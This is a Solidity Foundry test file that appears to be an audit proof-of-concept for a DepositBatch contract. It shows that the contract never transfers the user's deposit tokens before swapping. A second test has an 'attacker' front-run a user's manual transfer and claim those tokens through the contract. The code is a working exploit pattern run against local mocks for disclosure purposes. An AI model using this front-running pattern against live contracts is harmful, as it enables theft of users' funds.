// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../contracts/bundle/DepositBatch.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../../contracts/FunctionParameters.sol";

contract MockSafeEnsoShortcuts {
    address private immutable __self = address(this);

    event ShortcutExecuted(bytes32 shortcutId);
    event ActionExecuted(uint256 actionIndex, bool success);

    error OnlyDelegateCall();
    error ActionFailed(uint256 actionIndex);

    // Enum to represent different action types
    enum ActionType {
        APPROVE, // Approve tokens for a spender
        SWAP, // Execute a swap
        TRANSFER // Transfer tokens
    }

    // Struct to represent an action
    struct Action {
        ActionType actionType;
        address target; // Target contract address
        address tokenIn; // Token to use as input
        address tokenOut; // Token to receive as output (for swaps)
        address spender; // Spender address (for approvals)
        uint256 amount; // Amount to approve/swap/transfer
    }

    // @notice Execute a shortcut via delegate call with multiple actions
    // @param shortcutId The bytes32 value representing a shortcut
    // @param commands An array of bytes32 values that encode calls
    // @param state An array of bytes that are used to generate call data for each command
    function executeShortcut(
        bytes32 shortcutId,
        bytes32[] calldata commands,
        bytes[] calldata state
    ) external payable returns (bytes[] memory) {
        if (address(this) == __self) revert OnlyDelegateCall();

        // Create an array of actions to execute
        Action[] memory actions = new Action[](2);

        // Extract data from state
        address tokenIn = abi.decode(state[1], (address));
        address tokenOut = abi.decode(state[2], (address));
        uint256 amountIn = abi.decode(state[3], (uint256));
        address target = address(uint160(uint256(commands[0])));

        // First action: Approve tokens for the swap router
        actions[0] = Action({
            actionType: ActionType.APPROVE,
            target: tokenIn, // The token contract
            tokenIn: tokenIn, // Token to approve
            tokenOut: address(0), // Not used for approval
            spender: target, // Approve the swap router
            amount: amountIn // Amount to approve
        });

        // Second action: Execute the swap
        actions[1] = Action({
            actionType: ActionType.SWAP,
            target: target, // The swap router
            tokenIn: tokenIn, // Token to swap from
            tokenOut: tokenOut, // Token to swap to
            spender: address(0), // Not used for swap
            amount: amountIn // Amount to swap
        });

        // Execute all actions
        bytes[] memory results = new bytes[](actions.length);
        for (uint256 i = 0; i < actions.length; i++) {
            (bool success, bytes memory returnData) = executeAction(actions[i]);
            emit ActionExecuted(i, success);

            if (!success) {
                revert ActionFailed(i);
            }

            results[i] = returnData;
        }

        emit ShortcutExecuted(shortcutId);
        return results;
    }

    // Helper function to execute a single action
    function executeAction(
        Action memory action
    ) internal returns (bool, bytes memory) {
        if (action.actionType == ActionType.APPROVE) {
            // Execute approve
            bytes memory callData = abi.encodeWithSelector(
                IERC20.approve.selector,
                action.spender,
                action.amount
            );
            return action.target.call(callData);
        } else if (action.actionType == ActionType.SWAP) {
            // Execute swap
            bytes memory callData = abi.encodeWithSelector(
                MockSwapRouter.swap.selector,
                action.tokenIn,
                action.tokenOut,
                action.amount
            );
            return action.target.call(callData);
        } else if (action.actionType == ActionType.TRANSFER) {
            // Execute transfer
            bytes memory callData = abi.encodeWithSelector(
                IERC20.transfer.selector,
                action.spender, // recipient
                action.amount
            );
            return action.target.call(callData);
        }

        // Return success for unknown action types to avoid breaking the flow
        return (true, "");
    }
}

/**
 * @title MockToken
 * @notice A simple ERC20 token for testing purposes
 */
contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }
}

/**
 * @title MockPortfolio
 * @notice A mock implementation of the Portfolio contract for testing
 */
contract MockPortfolio {
    address[] public tokens;
    mapping(address => uint256) public deposits;

    constructor(address[] memory _tokens) {
        tokens = _tokens;
    }

    function getTokens() external view returns (address[] memory) {
        return tokens;
    }

    function multiTokenDepositFor(
        address user,
        uint256[] memory amounts,
        uint256 minMintAmount
    ) external {
        // Record deposits for verification
        for (uint256 i = 0; i < tokens.length; i++) {
            deposits[tokens[i]] += amounts[i];
        }
    }
}

/**
 * @title MockSwapRouter
 * @notice A mock implementation of a DEX router
 */
contract MockSwapRouter {
    // This function simulates a swap operation
    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) external returns (uint256) {
        // Log the current state for debugging
        console.log("MockSwapRouter - Swap called");
        console.log("MockSwapRouter - TokenIn:", tokenIn);
        console.log("MockSwapRouter - TokenOut:", tokenOut);
        console.log("MockSwapRouter - AmountIn:", amountIn);
        console.log("MockSwapRouter - Caller:", msg.sender);

        // Check allowance first
        uint256 allowance = IERC20(tokenIn).allowance(
            msg.sender,
            address(this)
        );
        console.log("MockSwapRouter - Allowance:", allowance);
        require(allowance >= amountIn, "Insufficient allowance for swap");

        // Check balance
        uint256 balance = IERC20(tokenIn).balanceOf(msg.sender);
        console.log("MockSwapRouter - Sender Balance:", balance);
        require(balance >= amountIn, "Insufficient token balance for swap");

        // Transfer tokens from sender to this contract
        bool success = IERC20(tokenIn).transferFrom(
            msg.sender,
            address(this),
            amountIn
        );
        require(success, "Token transfer failed");

        // Transfer output tokens to sender
        IERC20(tokenOut).transfer(msg.sender, amountIn * 2);

        console.log("MockSwapRouter - Swap successful");
        return amountIn * 2; // Just a dummy conversion rate
    }
}

/**
 * @title DepositBatchBugPOC
 * @notice Proof of Concept test for the DepositBatch contract vulnerability
 * @dev This test demonstrates that the DepositBatch contract fails to transfer tokens
 *      from the user to the contract before attempting to perform swaps
 */
contract DepositBatchBugPOC is Test {
    DepositBatch public depositBatch;
    MockToken public tokenA;
    MockToken public tokenB;
    MockPortfolio public user_portfolio;
    MockPortfolio public attacker_portfolio;
    MockSwapRouter public swapRouter;

    address public user = makeAddr("user");
    address[] public tokens;

    function setUp() public {
        // Create mock tokens
        tokenA = new MockToken("Token A", "TKNA");
        tokenB = new MockToken("Token B", "TKNB");

        // Setup token array
        tokens = new address[](2);
        tokens[0] = address(tokenA);
        tokens[1] = address(tokenB);

        // Deploy mock user_portfolio
        user_portfolio = new MockPortfolio(tokens);

        // Deploy mock swap router
        swapRouter = new MockSwapRouter();

        // The address of Enso's swap execution logic; swaps are delegated to this target. the contract below contains code for enso shortcuts. so calls to the swap router must pass through this enso contract
        address SWAP_TARGET = address(new MockSafeEnsoShortcuts());

        // Deploy deposit batch contract
        depositBatch = new DepositBatch(SWAP_TARGET);

        // Setup initial token balances for user and swap router
        vm.startPrank(address(this));
        tokenA.transfer(user, 1000 * 10 ** 18);
        tokenB.transfer(user, 1000 * 10 ** 18);
        tokenB.transfer(address(swapRouter), 1000 * 10 ** 18);
        vm.stopPrank();

        // Setup approvals
        vm.startPrank(user);
        tokenA.approve(address(depositBatch), 1000 * 10 ** 18);
        tokenB.approve(address(depositBatch), 1000 * 10 ** 18);
        vm.stopPrank();
    }

    /**
     * @notice Test to demonstrate the bug in multiTokenSwapAndDeposit
     * @dev This test shows that even though the user has approved tokens to the DepositBatch contract,
     *      the contract never transfers these tokens before attempting to perform swaps
     */
    function testMultiTokenSwapAndDepositBug() public {
        // Create Enso shortcut data for the swap
        bytes32 shortcutId = keccak256("swap");

        // Create command for the swap
        bytes32[] memory commands = new bytes32[](4);
        commands[0] = bytes32(uint256(uint160(address(swapRouter))));

        // Create state data for the swap
        bytes[] memory state = new bytes[](4);
        state[0] = abi.encodePacked(MockSwapRouter.swap.selector);
        state[1] = abi.encode(address(tokenA)); // tokenIn
        state[2] = abi.encode(address(tokenB)); // tokenOut
        state[3] = abi.encode(uint256(50 * 10 ** 18)); // amountIn

        // Encode the Enso shortcut call
        bytes memory swapData = abi.encodeWithSelector(
            MockSafeEnsoShortcuts.executeShortcut.selector,
            shortcutId,
            commands,
            state
        );

        // Create BatchHandler struct
        FunctionParameters.BatchHandler memory batchData = FunctionParameters
            .BatchHandler({
                _target: address(user_portfolio),
                _depositToken: address(tokenA),
                _callData: new bytes[](2),
                _minMintAmount: 0,
                _depositAmount: 100 * 10 ** 18
            });

        // Set up callData
        batchData._callData[0] = abi.encode(50 * 10 ** 18); // TokenA amount (deposit token)
        batchData._callData[1] = swapData; // Swap data for TokenB

        // Check initial balances
        uint256 userTokenABalanceBefore = tokenA.balanceOf(user);
        uint256 userTokenBBalanceBefore = tokenB.balanceOf(user);
        uint256 contractTokenABalanceBefore = tokenA.balanceOf(
            address(depositBatch)
        );
        uint256 contractTokenBBalanceBefore = tokenB.balanceOf(
            address(depositBatch)
        );

        console.log("User Token A Balance Before:", userTokenABalanceBefore);
        console.log("User Token B Balance Before:", userTokenBBalanceBefore);
        console.log(
            "Contract Token A Balance Before:",
            contractTokenABalanceBefore
        );
        console.log(
            "Contract Token B Balance Before:",
            contractTokenBBalanceBefore
        );

        // Execute multiTokenSwapAndDeposit - This should fail because tokens are never transferred to the contract
        vm.startPrank(user);

        // Manually transfer tokens to the contract - THIS IS WHAT'S MISSING IN THE CONTRACT
        //tokenA.transfer(address(depositBatch), 100 * 10**18);

        // We expect this to revert because the contract doesn't have tokens to swap
        vm.expectRevert(); //fails because no tokens of user is transferred to the depositBatch function before swap
        //there is no token.transferFrom(msg.sender, address(this), amount) in depositBatch.multiTokenSwapAndDeposit()
        depositBatch.multiTokenSwapAndDeposit(batchData, user);

        vm.stopPrank();

        // Check final balances - should be unchanged
        uint256 userTokenABalanceAfter = tokenA.balanceOf(user);
        uint256 userTokenBBalanceAfter = tokenB.balanceOf(user);
        uint256 contractTokenABalanceAfter = tokenA.balanceOf(
            address(depositBatch)
        );
        uint256 contractTokenBBalanceAfter = tokenB.balanceOf(
            address(depositBatch)
        );

        console.log("User Token A Balance After:", userTokenABalanceAfter);
        console.log("User Token B Balance After:", userTokenBBalanceAfter);
        console.log(
            "Contract Token A Balance After:",
            contractTokenABalanceAfter
        );
        console.log(
            "Contract Token B Balance After:",
            contractTokenBBalanceAfter
        );

        // Verify that no tokens were transferred
        assertEq(
            userTokenABalanceBefore,
            userTokenABalanceAfter,
            "User Token A balance should be unchanged"
        );
        assertEq(
            userTokenBBalanceBefore,
            userTokenBBalanceAfter,
            "User Token B balance should be unchanged"
        );
        assertEq(
            contractTokenABalanceBefore,
            contractTokenABalanceAfter,
            "Contract Token A balance should be unchanged"
        );
        assertEq(
            contractTokenBBalanceBefore,
            contractTokenBBalanceAfter,
            "Contract Token B balance should be unchanged"
        );
    }

    //this test shows that an attacker can frontrun a user by swapping immediately after user does a transfer of tokens to the deposit batch contract
    function testShowWhatHappensIfManualDepositIsAllowed() public {
        // Create Enso shortcut data for the swap
        bytes32 shortcutId = keccak256("swap");

        // Create command for the swap
        bytes32[] memory commands = new bytes32[](1);
        commands[0] = bytes32(uint256(uint160(address(swapRouter))));

        // Create state data for the swap
        bytes[] memory state = new bytes[](4);
        state[0] = abi.encodePacked(MockSwapRouter.swap.selector);
        state[1] = abi.encode(address(tokenA)); // tokenIn
        state[2] = abi.encode(address(tokenB)); // tokenOut
        state[3] = abi.encode(uint256(50 * 10 ** 18)); // amountIn

        // Encode the Enso shortcut call
        bytes memory swapData = abi.encodeWithSelector(
            MockSafeEnsoShortcuts.executeShortcut.selector,
            shortcutId,
            commands,
            state
        );

        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        // Deploy mock attacker_portfolio
        attacker_portfolio = new MockPortfolio(tokens);

        // Create BatchHandler struct for user
        FunctionParameters.BatchHandler
            memory batchData_user = FunctionParameters.BatchHandler({
                _target: address(user_portfolio),
                _depositToken: address(tokenA),
                _callData: new bytes[](2),
                _minMintAmount: 0,
                _depositAmount: 100 * 10 ** 18
            });

        // Create BatchHandler struct for attacker
        FunctionParameters.BatchHandler
            memory batchData_attacker = FunctionParameters.BatchHandler({
                _target: address(attacker_portfolio),
                _depositToken: address(tokenA),
                _callData: new bytes[](2),
                _minMintAmount: 0,
                _depositAmount: 100 * 10 ** 18
            });

        // Set up callData
        batchData_user._callData[0] = abi.encode(50 * 10 ** 18); // TokenA amount (deposit token)
        batchData_user._callData[1] = swapData; // Swap data for TokenB

        // Set up callData for attacker
        batchData_attacker._callData[0] = abi.encode(50 * 10 ** 18); // TokenA amount (deposit token)
        batchData_attacker._callData[1] = swapData; // Swap data for TokenB

        // First, make sure the attacker has some tokens to use for approvals
        vm.startPrank(address(this));
        tokenA.transfer(address(swapRouter), 200 * 10 ** 18); // Give swap router some tokenA
        tokenB.transfer(address(swapRouter), 200 * 10 ** 18); // Give swap router some tokenB
        vm.stopPrank();

        // User transfers tokens to the deposit batch contract
        vm.prank(user);
        // Manually transfer tokens to the contract - THIS IS WHAT'S MISSING IN THE CONTRACT
        tokenA.transfer(address(depositBatch), 100 * 10 ** 18);

        // Now the contract has tokens, but the swap would still fail because SWAP_TARGET is hardcoded
        // and we can't modify it for testing. In a real scenario, if tokens were transferred and
        // SWAP_TARGET was properly set up, the swap could work.

        //but this also has risk, malicious users can see this contract has tokens and try to put their own swap in first before the user call
        //and then the user will have their token stolen

        vm.prank(attacker);
        depositBatch.multiTokenSwapAndDeposit(batchData_attacker, attacker);

        // Check that tokens were deposited to the attacker's portfolio
        uint256 attackerPortfolioTokenABalance = tokenA.balanceOf(
            address(attacker)
        );
        uint256 attackerPortfolioTokenBBalance = tokenB.balanceOf(
            address(attacker)
        );

        console.log(
            "Attacker Portfolio TokenA Balance:",
            attackerPortfolioTokenABalance
        );
        console.log(
            "Attacker Portfolio TokenB Balance:",
            attackerPortfolioTokenBBalance
        );

        // The attacker should have received tokens in their portfolio
        assertGt(
            attackerPortfolioTokenABalance + attackerPortfolioTokenBBalance,
            0,
            "Attacker  should have received tokens attacker never had"
        );
    }
}
